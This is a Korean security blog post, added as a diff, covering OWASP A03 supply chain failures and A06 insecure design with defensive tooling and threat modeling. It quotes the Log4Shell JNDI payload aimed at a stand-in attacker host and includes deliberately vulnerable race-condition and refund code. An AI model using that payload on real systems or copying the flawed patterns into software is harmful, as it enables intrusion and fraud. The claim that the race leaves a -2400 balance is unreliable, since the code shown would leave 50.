@@ -1,0 +1,585 @@
+---
+title: "코드 밖의 리스크 - OWASP Top 10:2025 ep.04"
+description: "내가 짠 코드가 아무리 안전해도, 끌어다 쓰는 의존성과 빌드 파이프라인이 뚫리면 의미가 없습니다. 그리고 설계 자체가 잘못되어 있다면 어떤 구현도 그것을 구해낼 수 없습니다."
+summary: "Software Supply Chain Failures(A03)와 Insecure Design(A06)을 다룹니다. 의존성 관리와 SBOM, dependency confusion, install script 위험, SLSA. 그리고 위협 모델링과 비즈니스 로직 악용까지. 스캐너에 잡히지 않고 설계 단계에서 봐야 하는 두 카테고리입니다."
+date: 2026-04-28
+tags: ["security", "owasp", "supply-chain", "sbom", "threat-modeling", "secure-design"]
+draft: false
+---
+
+지금까지의 모든 방어는 "내가 짠 코드"에 대한 것이었습니다. 그런데 현대 애플리케이션의 90% 이상은 남이 짠 코드의 조합입니다. 그리고 코드를 아무리 잘 짜도, 설계 자체가 잘못되어 있으면 그것을 구해낼 수 없습니다.
+
+---
+
+## 왜 이 두 가지를 같이 다루는가
+
+이번 편의 두 카테고리는 **"코드 라인 단위에서는 발견되지 않는 문제"** 라는 공통점이 있습니다.
+
+**Software Supply Chain Failures(A03)**는 2025년판에서 새로 강조된 카테고리입니다. 2021년의 "Vulnerable and Outdated Components"가 더 넓어져, 의존성뿐 아니라 빌드 파이프라인·아티팩트 무결성·배포 채널 전체를 포괄합니다. SolarWinds, Log4Shell, XZ Utils 백도어 같은 사건들이 이 카테고리의 무게를 끌어올렸습니다.
+
+**Insecure Design(A06)**은 2021년에 새로 추가되어 2025년에도 그대로 유지된 카테고리입니다. **"보안 통제가 없거나 효과가 없는 설계 결함"**을 다룹니다. 구현 결함이 아니라 설계 결함입니다. 코드는 의도대로 동작하지만 그 의도 자체가 잘못된 경우입니다.
+
+두 카테고리가 만나는 지점은 **"빌드 직전이 아니라 설계 시점에 봐야 한다"**는 것입니다. 정적 스캐너로는 잡히지 않습니다. 사람이 의식적으로 던져야 할 질문들입니다.
+
+---
+
+## A03. Software Supply Chain Failures
+
+### 공급망 실패의 정체
+
+이 카테고리의 핵심 질문은 **"내가 실행하는 코드 중 내가 직접 작성한 것은 몇 퍼센트인가?"** 입니다. 답은 보통 1~5%입니다. 나머지는 의존성, 베이스 이미지, 빌드 도구, CI 액션, CDN 스크립트의 조합입니다. 이 중 하나라도 변조되면 우리 시스템에 침투할 통로가 됩니다.
+
+![공급망 공격 경로](sec-04-01-supply-chain-vectors.svg)
+
+공격은 세 단계 중 어느 곳에서나 시작될 수 있습니다.
+
+**Stage 1 — Source**: 우리가 가져오는 패키지 자체가 악성. typosquatting(`requets`처럼 오타 이름), 유지보수자 침해, dependency confusion, 간접 의존성을 통한 침투, 알려진 CVE 미패치.
+
+**Stage 2 — Build**: 빌드 시스템이 침투됨. CI/CD에 백도어가 주입되어 정상 코드를 빌드해도 결과물에 악성 코드가 포함됨. SolarWinds 패턴.
+
+**Stage 3 — Distribute**: 배포 채널 침해. CDN 변조(polyfill.io), 자동 업데이트 우회, 패키지 레지스트리 계정 탈취.
+
+### 실제 사례
+
+**Log4Shell (CVE-2021-44228, 2021년 12월)**. Java 로깅 라이브러리 Log4j의 한 줄짜리 취약점. 로그에 `${jndi:ldap://attacker.com/evil}` 같은 문자열이 들어가면 원격 코드 실행. 발표 직후 모든 조직이 같은 질문을 했습니다. **"우리가 Log4j 쓰나? 어디에서?"** SBOM이 있는 조직은 30분 안에 답했고, 없는 조직은 며칠 걸렸습니다.
+
+**XZ Utils 백도어 (CVE-2024-3094, 2024년 3월)**. 리눅스 압축 라이브러리 xz/liblzma의 5.6.0 / 5.6.1 버전에 백도어 삽입. 발견된 것이 거의 기적이었습니다. **공격자가 2년에 걸쳐 점진적으로 유지보수자 신뢰를 쌓고** 권한을 받은 뒤 백도어를 심었습니다. SSH 데몬을 우회할 수 있는 백도어가 주요 리눅스 배포판에 들어가기 직전에 발견됐습니다. "공급망 공격이 얼마나 길게 준비될 수 있는가"를 보여준 사례.
+
+**event-stream npm (2018)**. 인기 npm 패키지의 유지보수자가 권한을 신원 불명의 사람에게 양도. 다음 릴리스에 암호화폐 지갑 탈취 코드 삽입. 수많은 프로젝트가 영향받았습니다.
+
+**SolarWinds Orion (2020)**. 빌드 시스템 자체 침투. 정상 서명된 업데이트로 18,000개 조직에 백도어 배포. "공식 채널의 신뢰"가 무너진 사건.
+
+**Capital One (2019)**. SSRF 한 번이 IAM 자격증명 탈취로 이어져 1억 명 데이터 유출. 정확히는 클라우드 설정 결함이지만, 공급망 차원으로 보면 "사용 중인 클라우드 서비스의 메타데이터 엔드포인트를 어떻게 다룰지"가 빠져 있던 설계 문제.
+
+### 의존성 관리의 기본기
+
+#### Lockfile은 협상이 아닙니다
+
+`package-lock.json`, `yarn.lock`, `pnpm-lock.yaml`, `Pipfile.lock`, `poetry.lock`, `Gemfile.lock` — **반드시 commit하세요.** 그리고 CI에서는 `npm ci`(lockfile 정확히 따르기)를 쓰지 `npm install`을 쓰지 않습니다.
+
+이유: lockfile이 없으면 같은 코드를 빌드해도 매번 다른 의존성 트리가 나올 수 있습니다. 어느 빌드는 안전한 버전, 어느 빌드는 취약한 버전. 재현성과 보안 양쪽 모두 무너집니다.
+
+```bash
+# CI에서는 항상 lockfile 기준
+npm ci      # package-lock.json 정확히
+yarn install --frozen-lockfile
+pip install -r requirements.txt --no-deps
+poetry install --no-update
+```
+
+#### SBOM 생성과 활용
+
+**SBOM(Software Bill of Materials)** 은 우리 애플리케이션이 사용하는 모든 컴포넌트의 명세입니다. Log4Shell 같은 사건이 터졌을 때 "우리가 영향받는가"를 30분 안에 답할 수 있게 하는 도구입니다.
+
+![SBOM 생성과 활용 흐름](sec-04-02-sbom-flow.svg)
+
+```bash
+# Syft — 컨테이너 이미지·디렉토리에서 SBOM 생성
+syft your-app:latest -o cyclonedx-json > sbom.json
+
+# Grype — SBOM에서 취약점 매칭
+grype sbom:./sbom.json
+
+# Trivy — 통합 도구 (이미지·SBOM·IaC·시크릿 스캔)
+trivy image your-app:latest
+trivy sbom sbom.json
+
+# 생태계 내장 도구
+npm audit
+pip-audit
+cargo audit
+```
+
+**CycloneDX**와 **SPDX**가 두 가지 표준 포맷입니다. 어느 쪽이든 도구 호환은 좋습니다.
+
+빌드 파이프라인에 SBOM 생성을 통합하고, **모든 릴리스 아티팩트와 함께 SBOM을 보관**하세요. 6개월 후 새 CVE가 발표됐을 때 그 시점의 우리 시스템이 영향받는지 확인할 수 있게 됩니다.
+
+#### 자동화된 의존성 업데이트
+
+수동 업데이트는 작동하지 않습니다. 의존성이 수십·수백 개인 프로젝트에서 사람이 매주 outdated 목록을 보고 판단하는 것은 지속 가능하지 않습니다.
+
+![Dependabot/Renovate 워크플로우](sec-04-03-dependency-automation.svg)
+
+**Dependabot** (GitHub 내장)과 **Renovate** (오픈소스, 더 강력) 두 도구가 표준입니다. 설정 한 번 하면 이후로는 PR이 자동으로 올라옵니다.
+
+```yaml
+# .github/dependabot.yml
+version: 2
+updates:
+  - package-ecosystem: "npm"
+    directory: "/"
+    schedule:
+      interval: "weekly"
+    open-pull-requests-limit: 10
+    groups:
+      # 패치/마이너는 그룹화하여 PR 폭발 방지
+      minor-and-patch:
+        update-types: ["patch", "minor"]
+
+  - package-ecosystem: "github-actions"
+    directory: "/"
+    schedule:
+      interval: "weekly"
+
+  - package-ecosystem: "docker"
+    directory: "/"
+    schedule:
+      interval: "weekly"
+```
+
+**측정 지표는 MTTP (Mean Time to Patch)** 입니다. CVE 발표부터 우리 시스템에 패치가 적용되기까지의 평균 시간. 24시간 이내가 목표.
+
+#### 우선순위 정하기
+
+모든 CVE를 즉시 패치할 수 없습니다. 합리적인 기준이 필요합니다.
+
+- **CVSS 9+ (Critical) + 실제 활용 중**: 24시간 내 패치 또는 우회 조치
+- **CVSS 7~8.9 (High)**: 1주일 내
+- **CVSS 4~6.9 (Medium)**: 정기 사이클
+- **사용하지 않는 코드 경로**: 후순위지만 추적은 유지
+
+**EPSS (Exploit Prediction Scoring System)** 점수도 함께 봅니다. CVSS는 "잠재적 심각도", EPSS는 "실제 악용될 확률". 둘이 다른 지표입니다. CVSS는 높지만 EPSS가 낮은 취약점은 후순위로 미룰 수 있고, 그 반대도 마찬가지입니다.
+
+### Dependency Confusion 공격
+
+조심해야 할 특수 패턴 하나를 따로 짚습니다. 2021년 Alex Birsan이 시연하면서 유명해진 공격입니다.
+
+**시나리오**: 우리 회사가 내부에서 `mycompany-utils`라는 private 패키지를 npm 사내 레지스트리에 두고 사용합니다. 공격자가 같은 이름 `mycompany-utils`를 **public npmjs.com에 더 높은 버전으로 등록**합니다. 빌드 도구가 잘못 설정되어 있으면 public 버전을 우선 가져옵니다. 결과: 공격자 코드가 우리 빌드에 들어옵니다.
+
+**방어**:
+
+- **Scoped 패키지 사용**: `@yourorg/utils` 형식. 스코프는 등록한 조직만 publish 가능
+- **레지스트리 우선순위 명시**: `.npmrc`에 internal registry를 명시적으로 설정
+- **package.json에 명시적 등록**: 모든 의존성의 출처를 명확히
+
+```ini
+# .npmrc 예시
+@yourorg:registry=https://npm.yourorg.internal/
+registry=https://registry.npmjs.org/
+```
+
+### Install Script 위험
+
+npm/pip 패키지가 설치 시점에 실행하는 스크립트(`postinstall`, `setup.py` 등)는 **임의 코드 실행 경로**입니다. CI에서 익숙하지 않은 패키지를 설치하는 순간 그 코드가 CI 환경에서 실행됩니다.
+
+```bash
+# npm: postinstall 스크립트 비활성화
+npm install --ignore-scripts
+
+# 핵심 의존성만 별도 처리
+npm rebuild some-trusted-package
+```
+
+장단점이 있습니다. ignore-scripts를 켜면 native 모듈이 빌드되지 않을 수 있어 업무에 따라 트레이드오프 발생. 다만 CI에서는 보안 우선이 합리적입니다.
+
+### 컨테이너 베이스 이미지 위생
+
+`FROM ubuntu:latest`는 두 가지 문제가 있습니다.
+
+1. **`latest` 태그는 변동**합니다. 어제 빌드와 오늘 빌드가 다른 이미지일 수 있습니다.
+2. **풀 OS 이미지는 공격 표면이 큽니다**. 우리가 안 쓰는 바이너리도 다 깔려 있습니다.
+
+```dockerfile
+# 나쁨
+FROM ubuntu:latest
+RUN apt-get update && apt-get install -y python3
+
+# 좋음 — distroless, digest 고정
+FROM gcr.io/distroless/python3-debian12@sha256:abc123...
+```
+
+베이스 이미지 자체도 정기 업데이트가 필요합니다. Renovate가 이것도 처리해줍니다.
+
+### CI/CD 파이프라인 보호
+
+ep.03에서 일부 다뤘던 내용을 더 깊게 봅니다. 빌드 파이프라인이 침투되면 코드 리뷰를 우회한 임의 코드 배포가 가능합니다.
+
+```yaml
+# 외부 액션을 commit SHA로 고정 (태그 변경 가능성 차단)
+- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
+
+# 권한 최소화 — default-write 대신 명시
+permissions:
+  contents: read
+  pull-requests: write
+  id-token: write  # OIDC 사용 시
+
+# OIDC로 long-lived 자격증명 제거
+- uses: aws-actions/configure-aws-credentials@<sha>
+  with:
+    role-to-assume: arn:aws:iam::123456789:role/GitHubActionsDeployRole
+    aws-region: ap-northeast-2
+
+# pull_request_target 사용 시 시크릿 노출 주의
+# fork PR이 워크플로우를 변조하지 않도록
+on:
+  pull_request_target:
+    types: [labeled]
+# 'safe-to-test' 라벨 등으로 명시적 게이트
+```
+
+### SLSA 프레임워크
+
+**SLSA (Supply-chain Levels for Software Artifacts)** 는 Google이 주도하는 공급망 보안 프레임워크입니다. Level 1~4로 단계적 도입 가능.
+
+- **L1**: 빌드 자동화 + provenance 기록
+- **L2**: 호스팅된 빌드 시스템 + 인증된 출처
+- **L3**: 격리된 빌드 환경
+- **L4**: 양방향 검증 + 재현 가능한 빌드
+
+처음부터 L4를 목표로 하지 말고 L1부터 단계적으로. **npm 9+의 `--provenance` 플래그**가 가장 쉬운 시작점입니다. `npm publish --provenance`로 발행한 패키지는 npmjs.com에 "Built and signed on a public CI/CD" 배지가 표시됩니다.
+
+### 어떻게 확인하는가
+
+```bash
+# 의존성 취약점 한 번에 스캔
+npm audit
+npm audit --audit-level=moderate
+pip-audit
+cargo audit
+bundle audit
+
+# 통합 도구
+trivy image your-app:latest
+trivy fs ./
+
+# SBOM 생성·비교
+syft your-app:latest -o cyclonedx-json > sbom-current.json
+diff <(jq '.components | sort_by(.name)' sbom-old.json) \
+     <(jq '.components | sort_by(.name)' sbom-current.json)
+
+# 시크릿 누출 검사 (이전 commit 포함)
+gitleaks detect --source . --verbose
+trufflehog filesystem ./
+
+# Dockerfile 정적 분석
+hadolint Dockerfile
+trivy config Dockerfile
+
+# 의존성 라이센스 확인 (보안 외 컴플라이언스)
+license-checker --production --summary
+```
+
+### A03 체크리스트
+
+- [ ] Lockfile commit 및 CI에서 lockfile 기준 설치
+- [ ] SBOM 자동 생성 및 릴리스 아티팩트로 보관
+- [ ] Dependabot 또는 Renovate 설정
+- [ ] CVE 발표 → 패치까지 MTTP 측정
+- [ ] Critical CVE 24시간 내 패치 정책
+- [ ] Scoped 패키지 사용 (dependency confusion 방어)
+- [ ] CI에서 `--ignore-scripts` 또는 신뢰 화이트리스트
+- [ ] 베이스 이미지 digest 고정 (`latest` 금지)
+- [ ] 외부 GitHub Action commit SHA 고정
+- [ ] CI 권한 최소화 (`permissions:` 명시)
+- [ ] OIDC 기반 임시 자격증명 (long-lived key 제거)
+- [ ] 시크릿 누출 자동 스캔 (gitleaks 등)
+- [ ] 컨테이너 이미지 서명 (Sigstore/Cosign)
+- [ ] 라이센스 정책 검사 (GPL 등 도입 여부)
+
+### 더 파고들 포인트
+
+**Reproducible Builds**. 같은 소스로 빌드하면 항상 비트 단위로 동일한 바이너리가 나오는 빌드. 빌드 결과물 검증의 끝판왕. Debian, Arch Linux 등이 적용 중. 일반 애플리케이션도 timestamp·경로 의존성 제거로 점진적 도달 가능.
+
+**Sigstore Cosign keyless signing**. OIDC 기반으로 키 없이 컨테이너 이미지에 서명. 키 관리 부담 없이 공급망 검증을 시작할 수 있는 가장 쉬운 방법.
+
+**Vulnerability Exploitability eXchange (VEX)**. "이 CVE가 우리 제품에 영향이 있는가"를 표준 포맷으로 명시. 모든 CVE에 대응하는 대신 진짜 영향 있는 것만 추리는 도구.
+
+---
+
+## A06. Insecure Design
+
+### 디자인 결함의 정체
+
+A06이 어렵습니다. 다른 카테고리는 "이런 패턴은 잘못됐다"를 명확히 짚을 수 있는데, A06은 **"보안 통제가 처음부터 빠진 설계"** 라는 추상적인 영역이기 때문입니다.
+
+OWASP의 정의를 가져오면: *"Insecure design is a broad category representing different weaknesses, expressed as 'missing or ineffective control design.'"* — 통제 자체가 없거나 효과가 없는 설계.
+
+구체적인 예시:
+- 비밀번호 재설정 질문이 SNS에서 답을 찾을 수 있는 것 (생일, 출신 학교 등)
+- 영화관 예매 시스템에서 한 사람이 모든 좌석을 선점할 수 있는 구조
+- 1인 1쿠폰 의도이지만 동시 요청을 막는 메커니즘이 설계에 없음
+- 자동완성으로 다른 사용자의 정보를 추측 가능
+
+이런 것들은 **코드 라인을 보면 정상**입니다. 의도대로 동작하기 때문입니다. 문제는 의도 자체가 잘못된 것입니다.
+
+### Threat Modeling — 설계 단계의 도구
+
+위협 모델링은 "이 시스템이 어떻게 깨질 수 있는가"를 **설계 시점에** 체계적으로 묻는 활동입니다. 코드를 짜기 전에, 또는 큰 변경 전에 합니다.
+
+#### STRIDE 프레임워크
+
+Microsoft가 만든 STRIDE는 위협을 6가지 범주로 봅니다.
+
+![STRIDE 위협 모델링 프레임워크](sec-04-04-stride-threat-modeling.svg)
+
+각 글자가 깨뜨리는 보안 속성과 짝을 이룹니다.
+
+- **S**poofing — Authentication을 깸 ("이 사람이 정말 그 사람인가?")
+- **T**ampering — Integrity를 깸 ("이 데이터가 변조되지 않았나?")
+- **R**epudiation — Non-repudiation을 깸 ("누가 무엇을 했는지 증명되나?")
+- **I**nformation Disclosure — Confidentiality를 깸 ("새면 안 되는 것이 새지 않나?")
+- **D**enial of Service — Availability를 깸 ("일부러 멈추게 할 수 있나?")
+- **E**levation of Privilege — Authorization을 깸 ("낮은 권한이 높은 권한이 될 수 있나?")
+
+#### 실전 위협 모델링 흐름
+
+1. **시스템 그리기**: 데이터 흐름도(DFD). 외부 entity, process, data store, data flow를 식별. 신뢰 경계를 명시적으로 그림.
+2. **자산 식별**: 보호해야 할 데이터·기능 목록 (예: 사용자 PII, 결제 정보, 관리자 기능).
+3. **위협 식별**: 각 컴포넌트와 데이터 흐름에 STRIDE 적용. "이 인증 단계에서 Spoofing이 가능한가?", "이 DB 쿼리에 Tampering이 가능한가?"
+4. **위험 평가**: 발생 가능성 × 영향. 우선순위 정렬.
+5. **대응 결정**: 완화(mitigate), 수용(accept), 이전(transfer), 회피(avoid).
+6. **검증**: 구현이 끝난 뒤 위협 모델이 잘 반영됐는지 점검.
+
+#### 가벼운 시작
+
+큰 회사들이 쓰는 정식 프로세스는 부담스러울 수 있습니다. 작은 팀에서는 다음 정도로 시작합니다.
+
+**기능 한 줄짜리 위협 모델**:
+
+> 기능: 사용자가 비밀번호 재설정 링크를 이메일로 받습니다.
+> 
+> - **S**poofing: 다른 사용자의 이메일로 재설정 트리거 가능? → 재설정은 본인 인증 없이 트리거되지만, 링크는 그 이메일로만 감
+> - **T**ampering: 링크의 토큰을 조작해 다른 계정 재설정? → 토큰은 서버에서 검증, 무작위 32바이트
+> - **R**epudiation: 재설정 사실이 기록되나? → audit log에 기록
+> - **I** Disclosure: 토큰이 URL 파라미터로 → Referer 헤더로 외부 노출 위험. **발견된 위협**.
+> - **D**oS: 같은 이메일로 무한 재설정 요청? → Rate limit 필요. **발견된 위협**.
+> - **E**oP: 재설정 후 권한 변경 가능? → 재설정은 비밀번호만 바꾸고 권한 건드리지 않음.
+
+위 단계만 해도 두 가지 빠진 통제가 발견됩니다. 이게 위협 모델링의 가치입니다.
+
+### Secure by Default
+
+설계 원칙 중 가장 중요한 것 하나만 꼽으면 **"기본값이 안전해야 한다"** 입니다.
+
+- 권한: 기본 거부, 명시적 허용
+- 가시성: 기본 비공개, 명시적 공개
+- 통신: 기본 HTTPS, HTTP는 명시적 예외
+- 입력 검증: 기본 strict, 느슨함은 명시적 옵트인
+- 에러 메시지: 기본 generic, 상세는 내부 로그에만
+
+기본값이 안전하면 **실수해도 사고가 나지 않습니다**. 기본값이 위험하면 누군가 매번 의식적으로 보안을 켜야 하는데, 이건 결국 빠뜨립니다.
+
+### Defense in Depth
+
+여러 레이어로 방어합니다. 한 레이어가 뚫려도 다음 레이어가 막도록.
+
+ep.01의 IDOR 예시를 다시 보면: 애플리케이션 권한 체크 → DB 쿼리의 소유자 제약 → DB 컬럼 권한 → audit log. 4중 방어. 어느 한 곳이 뚫려도 나머지가 받쳐줍니다.
+
+설계 단계에서 자주 빠지는 함정: **"여기서 검증하니까 저기서는 안 해도 된다"**. 시간이 지나면 "여기"의 검증이 어떤 이유로 빠지거나 우회되고, "저기"는 처음부터 검증을 안 했기 때문에 사고가 납니다.
+
+### 비즈니스 로직 악용
+
+설계 결함이 가장 많이 나타나는 영역. **자동 스캐너로는 절대 잡히지 않는** 영역이기도 합니다.
+
+![비즈니스 로직 악용 패턴](sec-04-05-business-logic-exploit.svg)
+
+#### 패턴 1: Race Condition
+
+동시 요청으로 검증과 수행 사이의 틈을 노립니다.
+
+```python
+# 취약: 잔액 체크와 차감 사이의 race
+def withdraw(user_id, amount):
+    balance = db.get_balance(user_id)  # 1. 조회: 100원
+    if balance >= amount:               # 2. 체크: 50 <= 100, OK
+        db.update_balance(user_id, balance - amount)  # 3. 차감
+        return success
+    return fail
+
+# 동시에 50원 출금 요청 50개를 보내면?
+# 모두 1번 단계에서 100원을 보고, 모두 2번 통과, 모두 3번 차감
+# 잔액이 -2400원이 됨
+
+# 안전: DB 레벨 락 또는 원자적 연산
+def withdraw(user_id, amount):
+    with db.transaction():
+        rows_affected = db.execute("""
+            UPDATE accounts SET balance = balance - %s
+            WHERE user_id = %s AND balance >= %s
+        """, [amount, user_id, amount])
+        return rows_affected == 1
+```
+
+쿠폰·재고 같은 것도 같은 패턴입니다. **DB의 원자적 update + WHERE 조건으로 검증**이 핵심.
+
+#### 패턴 2: 음수·오버플로우
+
+입력 범위 검증이 빠지면 음수 환불, 정수 오버플로우 같은 사고가 발생합니다.
+
+```python
+# 취약
+def refund(amount):
+    update_balance(user_id, current_balance + amount)
+# amount = -100 → 사용자 잔액 -100... 이 아니라 +100? 사이트 코드 따라 다름
+
+# 안전
+def refund(amount):
+    if amount <= 0 or amount > MAX_REFUND:
+        raise InvalidAmount
+    ...
+```
+
+#### 패턴 3: 단계 우회
+
+다단계 플로우(장바구니 → 결제 → 완료)에서 중간 단계를 건너뛰는 공격.
+
+```
+1. /cart → /checkout → /payment → /complete?order_id=123
+                                              ↑ 결제 없이 직접 호출하면?
+```
+
+방어: 서버 측 상태 머신. 각 단계는 이전 단계 완료를 검증. 또는 단계 사이에 서명된 토큰 전달.
+
+#### 패턴 4: 재사용·중첩
+
+일회성이어야 하는 토큰을 재사용하거나, 중첩 불가 쿠폰을 동시 적용.
+
+```python
+# 안전
+def use_coupon(coupon_code, user_id):
+    with db.transaction():
+        coupon = db.get_coupon_for_update(coupon_code)
+        if coupon.used:
+            raise AlreadyUsed
+        coupon.used = True
+        coupon.used_by = user_id
+        db.save(coupon)
+        ...
+```
+
+`SELECT ... FOR UPDATE` (또는 ORM 동등 표현)로 행을 잠근 뒤 검증·수정.
+
+#### 패턴 5: 자동완성·열거를 통한 정보 수집
+
+회원가입 폼의 "이미 사용 중인 이메일입니다" 메시지 → 가입자 이메일 enumeration.
+비밀번호 재설정의 "해당 이메일이 등록되지 않았습니다" → 같은 문제.
+
+방어: 두 경우 모두 동일한 generic 메시지 ("재설정 메일을 보냈습니다 — 등록된 계정이라면").
+
+### Rate Limiting의 설계
+
+DoS만 방어하는 도구가 아닙니다. **비즈니스 로직 악용을 막는 핵심 통제**이기도 합니다.
+
+설계 시 결정 사항:
+
+- **무엇 단위로 제한할 것인가**: IP, 사용자 ID, API 키, 엔드포인트
+- **얼마나**: 분당, 시간당, 일당
+- **부드럽게 vs 단단하게**: 429 거부 vs 429 + Retry-After + 요청 큐잉
+- **인증 시도 vs 일반 요청 분리**: 인증 실패는 더 엄격하게
+
+```nginx
+# nginx 예시
+limit_req_zone $binary_remote_addr zone=auth:10m rate=5r/m;
+limit_req_zone $binary_remote_addr zone=api:10m rate=60r/m;
+
+location /login {
+    limit_req zone=auth burst=2 nodelay;
+}
+
+location /api/ {
+    limit_req zone=api burst=10;
+}
+```
+
+레이어별 다중 적용도 고려: WAF / CDN 단 + nginx / load balancer 단 + 애플리케이션 단. 한 레이어가 우회돼도 다음이 받아칩니다.
+
+### A06 체크리스트
+
+- [ ] 신규 기능 설계 시 위협 모델링 (STRIDE 등) 수행
+- [ ] 데이터 흐름도와 신뢰 경계 명시
+- [ ] "기본값 거부" 원칙 적용
+- [ ] Defense in depth 구조 (한 레이어 뚫려도 다음 레이어)
+- [ ] 비즈니스 로직 검증을 서버에서 (클라이언트만 신뢰 X)
+- [ ] Race condition 방어: DB 락 또는 원자적 연산
+- [ ] 입력 범위 검증 (음수, 오버플로우)
+- [ ] 다단계 플로우의 상태 머신
+- [ ] 일회성 토큰 사용 후 무효화 + DB 기록
+- [ ] 정보 enumeration 방지 (generic 응답)
+- [ ] Rate limit 다층 적용
+- [ ] 인증 시도와 일반 요청 분리된 rate limit
+- [ ] 보안 요구사항을 user story / acceptance criteria에 포함
+
+### 더 파고들 포인트
+
+**Abuse Cases**. 일반적인 user story("사용자는 X를 할 수 있다") 외에 **abuser story**("악의적 사용자는 Y를 시도할 수 있다")를 함께 작성. 각 abuser story에 대한 방어를 acceptance criteria에 포함.
+
+**Misuse Case Analysis**. 정상 사용 흐름(use case)과 악용 흐름(misuse case)을 같은 다이어그램에 그려 대비시키는 기법. 빠진 통제가 시각적으로 드러납니다.
+
+**Pre-mortem**. 프로젝트가 보안 사고로 망한 미래를 가정하고 "왜 망했을까"를 역추적하는 워크숍. 위협 모델링의 변형.
+
+**Trust on First Use (TOFU) 위험**. SSH key, certificate pinning, Passkey 등에서 "처음 본 것을 신뢰" 패턴의 한계. 첫 접속이 중간자에 노출되면 그 신뢰가 영구적 약점이 됨.
+
+---
+
+## 자주 묶여서 나타나는 사고 패턴
+
+A03과 A06은 다른 카테고리들과 자주 연쇄됩니다.
+
+**패턴 1: 의존성 CVE → 알려진 공격 → 데이터 유출**
+
+알려진 CVE가 있는 라이브러리를 패치하지 않은 상태. 공격자는 공개된 PoC 코드로 진입. 인증 우회 또는 RCE → 데이터 탈취. **CVE 공개 → 공격 시작**까지 평균 며칠 이내. MTTP를 짧게 가져가는 것이 핵심.
+
+**패턴 2: Dependency confusion → 빌드 침투 → 정식 배포**
+
+내부 패키지명이 public registry에 비어 있음. 공격자가 같은 이름으로 등록. 신규 빌드에 공격자 코드가 포함됨. 정식 서명까지 붙어 모든 사용자에게 배포.
+
+**패턴 3: 설계 결함 + 정상 코드 = 사고**
+
+쿠폰 시스템에 race condition. 코드 리뷰 통과. 자동 테스트 통과. 정적 스캐너 통과. 그러나 동시 요청 50개로 1인 50개 사용 가능. **위협 모델링이 있었다면 설계 단계에서 발견**됐을 문제.
+
+**패턴 4: Rate limit 부재 → credential stuffing → 계정 탈취**
+
+`/login` 엔드포인트에 rate limit 없음. 공격자가 유출된 자격증명 목록으로 봇 공격. 일부 계정 탈취 성공. 이어서 ep.01의 인증 카테고리 사고로 발전.
+
+---
+
+## 이번 편 체크리스트 총정리
+
+**공급망 (A03)**
+- [ ] Lockfile commit + CI lockfile 기준
+- [ ] SBOM 자동 생성 + 보관
+- [ ] Dependabot/Renovate 자동 PR
+- [ ] MTTP 측정 + 24시간 정책 (Critical)
+- [ ] Scoped 패키지 (dependency confusion)
+- [ ] CI install script 통제
+- [ ] 베이스 이미지 digest 고정
+- [ ] GitHub Action commit SHA 고정
+- [ ] OIDC 기반 임시 자격증명
+- [ ] 시크릿 누출 스캔
+- [ ] 컨테이너 이미지 서명
+
+**디자인 (A06)**
+- [ ] 신규 기능에 위협 모델링
+- [ ] 신뢰 경계 명시
+- [ ] 기본값 거부
+- [ ] Defense in depth
+- [ ] 서버 측 비즈니스 로직 검증
+- [ ] Race condition 방어
+- [ ] 입력 범위 검증
+- [ ] 일회성 토큰 무효화
+- [ ] 정보 enumeration 방지
+- [ ] Rate limit 다층 적용
+- [ ] Abuser story 작성 + acceptance criteria
+
+---
+
+## 참고 자료
+
+- OWASP. (2025). *A03:2025 – Software Supply Chain Failures*. https://owasp.org/Top10/2025/A03_2025-Software_Supply_Chain_Failures/
+- OWASP. (2025). *A06:2025 – Insecure Design*. https://owasp.org/Top10/2025/A06_2025-Insecure_Design/
+- OWASP. *Threat Modeling Cheat Sheet*. https://cheatsheetseries.owasp.org/cheatsheets/Threat_Modeling_Cheat_Sheet.html
+- OWASP. *Software Component Verification Standard (SCVS)*. https://owasp.org/www-project-software-component-verification-standard/
+- SLSA. *Supply-chain Levels for Software Artifacts*. https://slsa.dev
+- CISA. (2024). *Software Bill of Materials (SBOM)*. https://www.cisa.gov/sbom
+- Microsoft. *The STRIDE Threat Model*. https://learn.microsoft.com/en-us/azure/security/develop/threat-modeling-tool-threats
+- Birsan, A. (2021). *Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies*. https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
+- Sigstore. *Cosign — Container Signing*. https://docs.sigstore.dev/cosign/
+
+---
+
+## 다음 편 예고
+
+> [ep.05 - 운영의 관측과 탄력성](/web-security-owasp-2025-ep-05)
+
+지금까지 5편이 "사고를 막는" 이야기였다면 마지막 편은 **"사고가 일어났을 때 빨리 알고 안전하게 멈추기"** 입니다. Logging & Alerting Failures(A09)와 2025년판 신규 카테고리 Mishandling of Exceptional Conditions(A10)를 다룹니다. 무엇을 로깅해야 하고 무엇을 로깅하면 안 되는지, Fail Closed의 의미, Circuit Breaker, 그리고 Chaos Engineering의 보안적 의미까지.
